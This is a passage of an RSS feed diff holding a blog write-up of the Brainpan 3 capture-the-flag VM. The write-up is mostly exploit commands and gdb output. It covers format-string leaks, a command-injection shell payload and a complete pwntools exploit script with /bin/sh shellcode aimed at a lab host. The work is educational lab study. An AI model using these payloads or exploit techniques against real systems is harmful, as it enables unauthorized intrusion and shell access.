+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# man ./brainpan.8 
+
+DESCRIPTION
+       Congratulations, you win! Thanks for playing!
+
+FLAG
+       flag{tricksy-hobbitses-use-unix}
+
+BUGS
+       You found them all.
+
+AUTHOR
+       superkojiman - http://blog.techorganic.com
+
+TESTERS
+       Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!
+       barrebas - https://twitter.com/barrebas
+       Swappage - https://twitter.com/Swappage
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I am now going on an extended leave of absense to recover.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan: 3 - Part 1</title>
+      <link>http://rastamouse.me/writeups/2015/brainpan-3-part-1/</link>
+      <pubDate>Sat, 19 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/brainpan-3-part-1/</guid>
+      <description>
+
+&lt;p&gt;As with the rest of the series, the focus of brainpan3 is on binary explotation.  The challenges in this VM are certainly a step-up in terms of difficultly compared to brainpan&amp;rsquo;s 1 &amp;amp; 2, and require you to bypass many common protection mechanisms.  On-and-off, it took me about 2 months to solve :s&lt;/p&gt;
+
+&lt;h2 id=&#34;port-scan:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Port Scan&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sT -p- -T5 192.168.56.105
+
+Not shown: 65533 filtered ports
+PORT     STATE  SERVICE
+1337/tcp open   waste
+8080/tcp closed http-proxy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;access-code:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Access Code&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.56.105 1337
+
+
+  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
+  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
+  |   |  __ &amp;lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
+ ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|
+
+                                                            by superkojiman
+
+
+
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If the code regenerates after 3 incorrect attempts, it&amp;rsquo;s very unlikely we can bruteforce it.  With nothing else going for us, let&amp;rsquo;s see what else we can shove in.&lt;/p&gt;
+
+&lt;p&gt;You get a nice bit of ASCII art if you supply a large input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+
+
+                      /´¯/) 
+                    ,/¯  / 
+                   /    / 
+             /´¯/&#39;   &#39;/´¯¯`·¸ 
+          /&#39;/   /    /       /¨¯\ 
+        (&#39;(   ´   ´     ¯~/&#39;   &#39;) 
+         \                 &#39;     / 
+          &#39;&#39;   \           _.·´ 
+            \              ( 
+              \__-_-____-___\   
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we try some format strings, we get a message that suggests we might be on the right track?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %x.%x.%x.%x
+ERROR #4: WHAT IS THIS, AMATEUR HOUR?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We find that &lt;code&gt;%p&lt;/code&gt; works.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %p.%p.%p.%p.%p.%p
+ERROR #1: INVALID ACCESS CODE: 0xbfacf99c.(nil).0x1850.0xbfacf99c.(nil).0xa
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hopefully we can use this to find the access code on the stack.  After some searching, we determine that the code is in the third postition and we can use the decimal format to dump it out.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ACCESS CODE: %3$d
+ERROR #1: INVALID ACCESS CODE: 6224
+
+ACCESS CODE: 6224
+
+--------------------------------------------------------------
+SESSION: ID-1300
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;SHELL&lt;/code&gt; is obviously a troll.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 4
+SELECTED: 4
+reynard@brainpan3 $ ls
+total 0
+-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;session-name:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Session Name&lt;/h2&gt;
+
+&lt;p&gt;We have this banner across the top.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;--------------------------------------------------------------
+SESSION: ID-1300
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It has a session name but we can see that the &lt;code&gt;report&lt;/code&gt; function is disabled.  If we try and access it, we get told no :(&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 1
+SELECTED: 1
+REPORT MODE IS DISABLED IN THIS BUILD
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 3
+SELECTED: 3
+ENTER NEW SESSION NAME: new session
+--------------------------------------------------------------
+SESSION: new session
+ �u
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I modified the session name, I noticed some odd characters getting added underneath.  So I started mucking around with this input.  What I eventually found, was that I could overflow the values set here. See how &lt;code&gt;MENU [A]&lt;/code&gt; is now set.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER NEW SESSION NAME: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+--------------------------------------------------------------
+SESSION: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  AUTH   [Y]    REPORT [N]    MENU   [A]  
+--------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The postition required to overflow &lt;code&gt;REPORT&lt;/code&gt; is 253.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 3
+SELECTED: 3
+ENTER NEW SESSION NAME: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+--------------------------------------------------------------
+SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
+--------------------------------------------------------------
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we can access the report area.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+this is a report
+
+REPORT [this is a report4]
+SENDING TO REPORT MODULE
+
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124751.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [����҄�Ҍҟ������]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;On first impressions, it seems our input gets encrypted and stored in &lt;code&gt;anansi&#39;s&lt;/code&gt; home directory.  After some more experimenting I found that the input to report was vulnerable to a buffer overflow, since it was triggering the stack protection on the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+REPORT [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYYY]
+SENDING TO REPORT MODULE
+
+*** stack smashing detected ***: /var/www/repo/report terminated
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919124950.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [�������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
+Aborted (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s at this point we have to take a step back, without the actual binary to analyse I couldn&amp;rsquo;t see a way of progressing this further.&lt;/p&gt;
+
+&lt;h2 id=&#34;some-trolls:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Some Trolls&lt;/h2&gt;
+
+&lt;p&gt;Option &lt;code&gt;2  - VIEW CODE REPOSITORY&lt;/code&gt; opens up port &lt;code&gt;8080&lt;/code&gt; that we saw closed earlier.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-3/hacked.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The &lt;code&gt;robots&lt;/code&gt; file containts &lt;code&gt;Disallow: /bp3_repo&lt;/code&gt;&amp;hellip; which is yet another troll.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-3/mario.gif&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;After &lt;em&gt;more&lt;/em&gt; searching, we find a &lt;code&gt;repo&lt;/code&gt; directory, with a simple listing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Directory listing for /repo/
+
+    bofh
+    how-to-pwn-brainpan.jpg
+    README.txt
+    report
+    shell 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;bofh&lt;/code&gt; and &lt;code&gt;shell&lt;/code&gt; (my fav) both seem to be trolls.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ./shell 
+            ___
+        .-&amp;quot;; ! ;&amp;quot;-.
+      .&#39;!  : | :  !`.
+     /\  ! : ! : !  /\
+    /\ |  ! :|: !  | /\
+   (  \ \ ; :!: ; / /  )
+  ( `. \ | !:|:! | / .&#39; )
+  (`. \ \ \!:|:!/ / / .&#39;)
+   \ `.`.\ |!|! |/,&#39;.&#39; /
+    `._`.\\\!!!// .&#39;_.&#39;
+       `.`.\\|//.&#39;.&#39;
+        |`._`n&#39;_.&#39;|
+        &amp;quot;----^----&amp;quot;
+
+     here&#39;s your shell
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;report:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Report&lt;/h2&gt;
+
+&lt;p&gt;The &lt;code&gt;report&lt;/code&gt; binary is really where we need to focus our effort.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file report 
+report: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ba63c3cd3047efba60ab9d506bd5d954492c4660, not stripped
+
+root@kali:~/bp3# ./report 
+./report &amp;lt;report&amp;gt; [0|1]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It doesn&amp;rsquo;t matter which option you choose (0 or 1), you get the same result.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;               ____
+           .-&#39;&amp;amp;    &#39;-.
+          / __    __  \
+         :-(__)--(__)--;
+        (      (_       )
+         :             ;
+          \    __     /
+           `-._____.-&#39;
+             /`&amp;quot;&amp;quot;&amp;quot;`\
+            /    ,  \
+           /|/\/\/\ _\
+          (_|/\/\/\\__)
+            |_______|
+           __)_ |_ (__
+          (_____|_____)
+
+       YOU&#39;RE IN THE MATRIX
+           CHARLIE BROWN
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At some point, superkoijman showed me that this was from The Simpsons :)&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-3/matrix.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Let&amp;rsquo;s get into the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ checksec 
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If we disassemble a function called &lt;code&gt;cb&lt;/code&gt;, we spot a call to &lt;code&gt;uname&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass cb
+   0x08048b44 &amp;lt;+32&amp;gt;:	call   0x8048640 &amp;lt;uname@plt&amp;gt;
+   0x08048b49 &amp;lt;+37&amp;gt;:	mov    DWORD PTR [esp+0x4],0x8048e98
+
+gdb-peda$ x/s 0x8048e98
+0x8048e98:	&amp;quot;brainpan3&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So the hostname of the machine has to be &lt;code&gt;brainpan3&lt;/code&gt; before it&amp;rsquo;ll go any further.  I&amp;rsquo;m sure you could just NOP it out in gdb, or just change the hostname of your machine.  With that now working, I ran the binary twice.&lt;/p&gt;
+
+&lt;h2 id=&#34;bof-ing:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;BoF&amp;rsquo;ing&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report test 1
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213852.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [����]
+
+root@brainpan3:~/bp3# ./report test 0
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919213854.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obviously the SEGFAULT is interesting, so let&amp;rsquo;s run that again in gdb.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r test 0
+
+Stopped reason: SIGSEGV
+0x08040074 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You will notice that &lt;code&gt;74&lt;/code&gt; is &lt;code&gt;t&lt;/code&gt;.  Putting in a slightly longer input, we find that we can controll EIP after just 3 bytes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r AAABBBB 0
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;But where is the stack smashing message we saw earlier?  Turns out this only happens when you run the binary with &lt;code&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@brainpan3:~/bp3# ./report AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1
+[+] WRITING REPORT TO /home/anansi/REPORTS/20150919214423.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]
+*** stack smashing detected ***: ./report terminated
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So the way we are interacting with the binary over netcat, it is automatically run as &lt;code&gt;1&lt;/code&gt; rather than &lt;code&gt;0&lt;/code&gt;.  I went back to netcat to see if I could solve this problem before proceeding.  After some expermenting, I found that you could prematurely terminate the command being run.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:
+
+&amp;quot;      
+
+REPORT [&amp;quot;]
+SENDING TO REPORT MODULE
+
+sh: 1: Syntax error: Unterminated quoted string
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:
+
+AAABBBB&amp;quot; 0&amp;quot;
+
+REPORT [AAABBBB&amp;quot; 0&amp;quot;]
+SENDING TO REPORT MODULE
+
+Segmentation fault (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It was around this point I discovered an easier way in.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;ENTER REPORT, END WITH NEW LINE:
+
+`/bin/sh &amp;gt;&amp;amp;2`
+
+REPORT [`/bin/sh &amp;gt;&amp;amp;2`]
+SENDING TO REPORT MODULE
+
+id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wasn&amp;rsquo;t satisifed with getting through this way, so I carried on trying to solve the binary &amp;lsquo;properly&amp;rsquo;.&lt;/p&gt;
+
+&lt;p&gt;So after much disassembling, we find that we overwrite a pointer for &lt;code&gt;REPORT&lt;/code&gt; with our buffer.  If we break at &lt;code&gt;main&lt;/code&gt; and dump the area of memory, there is nothing there.  After our input gets written, we can see it on the stack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ b main
+gdb-peda$ r AAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC 0
+
+gdb-peda$ x/12wx 0x804b0a0
+0x804b0a0 &amp;lt;REPORT&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0b0 &amp;lt;REPORT+16&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b0c0 &amp;lt;REPORT+32&amp;gt;:	0x00000000	0x00000000	0x00000000	0x00000000
+
+gdb-peda$ c
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+
+gdb-peda$ x/12wx 0x804b0a0
+0x804b0a0 &amp;lt;REPORT&amp;gt;:	0x42414141	0x43424242	0x43434343	0x43434343
+0x804b0b0 &amp;lt;REPORT+16&amp;gt;:	0x43434343	0x43434343	0x43434343	0x43434343
+0x804b0c0 &amp;lt;REPORT+32&amp;gt;:	0x43434343	0x43434343	0x43434343	0x43434343
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The last bit of the puzzle is bypassing the &lt;code&gt;NX&lt;/code&gt; protection.  Actually&amp;hellip; we don&amp;rsquo;t need to, as superkojiman already does this for us.  There is a call to &lt;code&gt;mprotect&lt;/code&gt; in &lt;code&gt;main&lt;/code&gt; - I leave it as an exercise to the reader to verify, but it basically makes the &lt;code&gt;REPORT&lt;/code&gt; region of memory &lt;code&gt;rwx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now we&amp;rsquo;ve overwritten the pointer, we have to make a relative jump foward into our shellcode - truth be told, I couldn&amp;rsquo;t be bothered to work out by how much.  So I slapped a &lt;code&gt;+10&lt;/code&gt; in and placed a handful of &lt;code&gt;NOPs&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Testing this approach using a SIGTRAP.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39; print &amp;quot;AAA&amp;quot; + &amp;quot;\xb0\xb0\x04\x08&amp;quot; + &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; + &amp;quot;\xcc\xcc&amp;quot;&#39;) 0
+
+Stopped reason: SIGTRAP
+0x0804b0b2 in REPORT ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to put it all together.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+from pwn import *
+import struct, re
+
+r = remote(&amp;quot;192.168.56.102&amp;quot;, 1337)
+
+r.recvuntil(&amp;quot;CODE:&amp;quot;)
+r.send(&amp;quot;%3$d\n&amp;quot;)
+recv = r.recvuntil(&amp;quot;DIGITS&amp;quot;)
+
+pin = re.findall(r&amp;quot;INVALID ACCESS CODE: (.*?)\n&amp;quot;, recv)[0]
+print &amp;quot;Found Access Code: &amp;quot; + pin
+
+r.send(pin + &amp;quot;\n&amp;quot;)
+r.recvuntil(&amp;quot;COMMAND:&amp;quot;)
+
+print &amp;quot;Changing Session ID&amp;quot;
+
+session = &amp;quot;Y&amp;quot; * 253
+r.send(&amp;quot;3\n&amp;quot;)
+r.recvuntil(&amp;quot;NAME:&amp;quot;)
+r.send(session + &amp;quot;\n&amp;quot;)
+r.recvuntil(&amp;quot;COMMAND:&amp;quot;)
+
+print &amp;quot;Creating Report&amp;quot;
+
+rep = &amp;quot;AAA&amp;quot;
+rep += p32(0x804b0a0 + 10)
+rep += &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&amp;quot;
+rep += &#39;&amp;quot; 0&amp;quot;&#39;
+
+r.send(&amp;quot;1\n&amp;quot;)
+r.send(rep + &amp;quot;\n&amp;quot;)
+
+print &amp;quot;Dropping into shell&amp;quot;
+
+r.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./report.py 
+[+] Opening connection to 192.168.56.105 on port 1337: Done
+Found Access Code: 2144
+Changing Session ID
+Creating Report
+Dropping into shell
+[*] Switching to interactive mode
+ SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+
+REPORT [AAA\xaa\xb0\x0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901����
+                                                                   Qh//shh/bin\x89�̀&amp;quot; 0&amp;quot;\x16]
+SENDING TO REPORT MODULE
+
+$ id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;reynard:7a4f5a6448fafb319eff7e8a031bbd6b&#34;&gt;Reynard&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l /home/reynard/private
+total 16
+-rwsr-xr-x 1 reynard reynard 5568 May 19 18:28 cryptor
+-r-------- 1 reynard reynard   77 May 21 10:42 sekret.txt.enc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here we have a SUID binary owned by &lt;code&gt;reynard&lt;/code&gt;.  It&amp;rsquo;s difficult to get files in and out of brainpan3, as there seem to be really strict firewall rules in place.  So to transfer it to my machine for analysis, I used &lt;code&gt;xxd&lt;/code&gt; and copied the output in the Terminal.&lt;/p&gt;
+
+&lt;p&gt;The binary doesn&amp;rsquo;t appear to do very much, unless I&amp;rsquo;m not using it properly&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# ./cryptor
+Usage: ./cryptor file key
+root@kali:~/bp3# echo test&amp;gt;test
+root@kali:~/bp3# ./cryptor test qwerty
+[+] saving to test.enc
+root@kali:~/bp3# cat test.enc 
+test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s a stripped binary, but doesn&amp;rsquo;t have much in the way of protections.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/bp3# file cryptor
+cryptor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9b8ec7935e7b95d1897867969c43303940c4407e, stripped
+
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Simply running &lt;code&gt;strings&lt;/code&gt; reveals that &lt;code&gt;strcpy&lt;/code&gt; is in use somewhere.  I actually disassembled the binary in a trial version of Hopper - and we can see that it does a string length check on the input arguments.  This is the Hopper pseudo-code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    if (strlen(arg0) &amp;gt; 0x74) {
+            strncpy(var_78, arg0, 0x5a);
+    }
+    else {
+            strcpy(var_78, arg0);
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So if we supply an input for &lt;code&gt;argv0&lt;/code&gt; of 116 bytes, it will get passed to &lt;code&gt;strcpy&lt;/code&gt; rather than &lt;code&gt;strncpy&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ r $(python -c &#39;print &amp;quot;A&amp;quot; * 116&#39;) qwerty
+
+EAX: 0x0 
